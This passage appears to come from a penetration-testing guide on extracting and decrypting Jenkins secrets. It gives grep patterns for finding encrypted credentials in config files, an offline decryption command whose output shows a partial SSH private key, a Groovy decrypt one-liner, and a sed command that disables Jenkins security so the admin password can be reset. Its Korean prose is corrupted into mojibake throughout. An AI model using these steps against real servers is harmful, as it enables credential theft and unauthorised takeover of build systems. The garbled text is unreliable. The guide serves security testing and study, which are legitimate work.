`/credentials/`ì— ì ‘ê·¼í•˜ì—¬ ì¶©ë¶„í•œ ê¶Œí•œì´ ìˆë‹¤ë©´ ë¹„ë°€ì„ ë‚˜ì—´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” `credentials.xml` íŒŒì¼ ë‚´ì˜ ë¹„ë°€ë§Œ ë‚˜ì—´ë˜ì§€ë§Œ, **ë¹Œë“œ êµ¬ì„± íŒŒì¼**ì—ëŠ” **ë” ë§ì€ ìê²© ì¦ëª…**ì´ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê° í”„ë¡œì íŠ¸ì˜ **êµ¬ì„±ì„ ë³¼ ìˆ˜ ìˆë‹¤ë©´**, ì €ì¥ì†Œì— ì ‘ê·¼í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” **ìê²© ì¦ëª…(ë¹„ë°€)**ì˜ **ì´ë¦„**ê³¼ **í”„ë¡œì íŠ¸ì˜ ë‹¤ë¥¸ ìê²© ì¦ëª…**ë„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![](<../../.gitbook/assets/image (180).png>)

#### From Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### From disk

ì´ íŒŒì¼ë“¤ì€ **Jenkins ë¹„ë°€ì„ ë³µí˜¸í™”í•˜ëŠ” ë° í•„ìš”**í•©ë‹ˆë‹¤:

* secrets/master.key
* secrets/hudson.util.Secret

ì´ëŸ¬í•œ **ë¹„ë°€ì€ ì¼ë°˜ì ìœ¼ë¡œ ë‹¤ìŒì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

ë‹¤ìŒì€ ì´ë¥¼ ì°¾ê¸° ìœ„í•œ ì •ê·œ í‘œí˜„ì‹ì…ë‹ˆë‹¤:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Jenkins ë¹„ë°€ì„ ì˜¤í”„ë¼ì¸ìœ¼ë¡œ ë³µí˜¸í™”í•˜ê¸°

**ë¹„ë°€ì„ ë³µí˜¸í™”í•˜ëŠ” ë° í•„ìš”í•œ ë¹„ë°€ë²ˆí˜¸ë¥¼ ë¤í”„í•œ ê²½ìš°**, **ì´ ìŠ¤í¬ë¦½íŠ¸**ë¥¼ ì‚¬ìš©í•˜ì—¬ **ê·¸ ë¹„ë°€ì„ ë³µí˜¸í™”í•˜ì„¸ìš”**. [**this script**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py)
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Groovyì—ì„œ Jenkins ë¹„ë°€ í•´ë…í•˜ê¸°
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### ìƒˆ ê´€ë¦¬ì ì‚¬ìš©ì ë§Œë“¤ê¸°

1. `/var/lib/jenkins/config.xml` ë˜ëŠ” `C:\Program Files (x86)\Jenkins\`ì—ì„œ Jenkins config.xml íŒŒì¼ì— ì ‘ê·¼í•©ë‹ˆë‹¤.
2. `<useSecurity>true</useSecurity>`ë¼ëŠ” ë‹¨ì–´ë¥¼ ê²€ìƒ‰í•˜ê³  **`true`**ë¥¼ **`false`**ë¡œ ë³€ê²½í•©ë‹ˆë‹¤.
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Jenkins** ì„œë²„ë¥¼ **ì¬ì‹œì‘**í•©ë‹ˆë‹¤: `service jenkins restart`
4. ì´ì œ Jenkins í¬í„¸ë¡œ ë‹¤ì‹œ ê°€ë©´ **JenkinsëŠ” ì´ë²ˆì— ìê²© ì¦ëª…ì„ ìš”êµ¬í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. "**Manage Jenkins**"ë¡œ ì´ë™í•˜ì—¬ **ê´€ë¦¬ì ë¹„ë°€ë²ˆí˜¸ë¥¼ ë‹¤ì‹œ ì„¤ì •í•©ë‹ˆë‹¤**.
5. ì„¤ì •ì„ `<useSecurity>true</useSecurity>`ë¡œ ë³€ê²½í•˜ì—¬ **ë³´ì•ˆì„ ë‹¤ì‹œ í™œì„±í™”**í•˜ê³  **Jenkinsë¥¼ ë‹¤ì‹œ ì¬ì‹œì‘**í•©ë‹ˆë‹¤.

## ì°¸ê³ ë¬¸í—Œ

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
